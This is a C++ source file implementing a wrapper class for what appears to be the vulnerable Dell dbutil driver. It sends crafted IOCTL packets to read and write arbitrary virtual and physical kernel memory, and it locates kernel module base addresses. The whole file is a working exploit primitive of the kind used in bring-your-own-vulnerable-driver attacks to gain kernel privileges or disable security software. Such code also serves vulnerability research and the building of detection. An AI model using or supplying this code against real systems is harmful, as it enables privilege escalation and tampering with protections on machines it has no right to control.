#pragma once
#include "dbutil.h"

DBUTIL::DBUTIL() {
	HANDLE hDevice = CreateFileW(wszDrive,
		GENERIC_READ | GENERIC_WRITE, 0,
		NULL, OPEN_EXISTING, 0, NULL);
	DWORD err = GetLastError();
	if (err != 0) {
		printf("[!] Could not create handle to driver, error: %d\n", err);
	}
	DBUTIL::DriverHandle = hDevice;
}

DBUTIL::~DBUTIL() {
	if (DBUTIL::DriverHandle != INVALID_HANDLE_VALUE) {
		CloseHandle(DBUTIL::DriverHandle);
		DBUTIL::DriverHandle = INVALID_HANDLE_VALUE;
		printf("[+] Closed handle to driver\n");
	}
	printf("[+] DBUTIL object destroyed\n");
}

BOOL DBUTIL::VirtualRead(IN DWORD64 address, OUT void* buffer, IN size_t bytesToRead) {
	const DWORD sizeOfPacket = VIRTUAL_PACKET_HEADER_SIZE + bytesToRead;
	BYTE* tempBuffer = new BYTE[sizeOfPacket];
	DWORD64 garbage = GARBAGE_VALUE;
	memcpy(tempBuffer, &garbage, 0x8);
	memcpy(&tempBuffer[0x8], &address, 0x8);
	DWORD64 offset = 0x0;
	memcpy(&tempBuffer[0x10], &offset, 0x8);
	DWORD bytesReturned = 0;
	BOOL response = DeviceIoControl(DBUTIL::DriverHandle,
		IOCTL_VIRTUAL_READ,
		tempBuffer,
		sizeOfPacket,
		tempBuffer,
		sizeOfPacket,
		&bytesReturned,
		NULL);
	memcpy(buffer, &tempBuffer[0x18], bytesToRead);
	delete[] tempBuffer;
	return response;
}

BOOL DBUTIL::VirtualWrite(IN DWORD64 address, IN void* buffer, IN size_t bytesToWrite) {
	const DWORD sizeOfPacket = VIRTUAL_PACKET_HEADER_SIZE + bytesToWrite;
	BYTE* tempBuffer = new BYTE[sizeOfPacket];
	DWORD64 garbage = GARBAGE_VALUE;
	memcpy(tempBuffer, &garbage, PARAMETER_SIZE);
	memcpy(&tempBuffer[0x8], &address, PARAMETER_SIZE);
	DWORD64 offset = 0x0;
	memcpy(&tempBuffer[0x10], &offset, PARAMETER_SIZE);
	memcpy(&tempBuffer[0x18], buffer, bytesToWrite);
	DWORD bytesReturned = 0;
	BOOL response = DeviceIoControl(DBUTIL::DriverHandle,
		IOCTL_VIRTUAL_WRITE,
		tempBuffer,
		sizeOfPacket,
		tempBuffer,
		sizeOfPacket,
		&bytesReturned,
		NULL);
	delete[] tempBuffer;
	return response;
}

BOOL DBUTIL::PhysicalRead(IN DWORD64 address, OUT void* buffer, IN size_t bytesToRead) {
	const DWORD sizeOfPacket = PHYSICAL_PACKET_HEADER_SIZE + bytesToRead;
	BYTE* tempBuffer = new BYTE[sizeOfPacket];
	DWORD64 garbage = GARBAGE_VALUE;
	memcpy(tempBuffer, &garbage, PARAMETER_SIZE);
	memcpy(&tempBuffer[0x8], &address, PARAMETER_SIZE);
	DWORD bytesReturned = 0;
	BOOL response = DeviceIoControl(DBUTIL::DriverHandle,
		IOCTL_PHYSICAL_READ,
		tempBuffer,
		sizeOfPacket,
		tempBuffer,
		sizeOfPacket,
		&bytesReturned,
		NULL);
	memcpy(buffer, &tempBuffer[0x10], bytesToRead);
	delete[] tempBuffer;
	return response;
}

BOOL DBUTIL::PhysicalWrite(IN DWORD64 address, IN void* buffer, IN size_t bytesToWrite) {
	const DWORD sizeOfPacket = PHYSICAL_PACKET_HEADER_SIZE + bytesToWrite;
	BYTE* tempBuffer = new BYTE[sizeOfPacket];
	DWORD64 garbage = GARBAGE_VALUE;
	memcpy(tempBuffer, &garbage, PARAMETER_SIZE);
	memcpy(&tempBuffer[0x8], &address, PARAMETER_SIZE);
	memcpy(&tempBuffer[0x10], buffer, bytesToWrite);
	DWORD bytesReturned = 0;
	BOOL response = DeviceIoControl(DBUTIL::DriverHandle,
		IOCTL_PHYSICAL_WRITE,
		tempBuffer,
		sizeOfPacket,
		tempBuffer,
		sizeOfPacket,
		&bytesReturned,
		NULL);
	delete[] tempBuffer;
	return response;
}

DWORD64 DBUTIL::GetKernelBase(IN std::string name) {
	LPVOID lpImageBase[1024]{};
	DWORD lpcbNeeded{};
	int drivers{};
	char lpFileName[1024]{};
	DWORD64 imageBase{};
	BOOL success = EnumDeviceDrivers(
		lpImageBase,
		sizeof(lpImageBase),
		&lpcbNeeded
	);
	if (!success) {
		printf("[-] EnumDeviceDrivers failed, error: %d\n", GetLastError());
		return 0;
	}
	drivers = lpcbNeeded / sizeof(lpImageBase[0]);
	for (int i = 0; i < drivers; i++) {
		GetDeviceDriverBaseNameA(
			lpImageBase[i],
			lpFileName,
			sizeof(lpFileName) / sizeof(char)
		);
		if (!strcmp(name.c_str(), lpFileName)) {
			imageBase = (DWORD64)lpImageBase[i];
			break;
		}
	}
	return imageBase;
}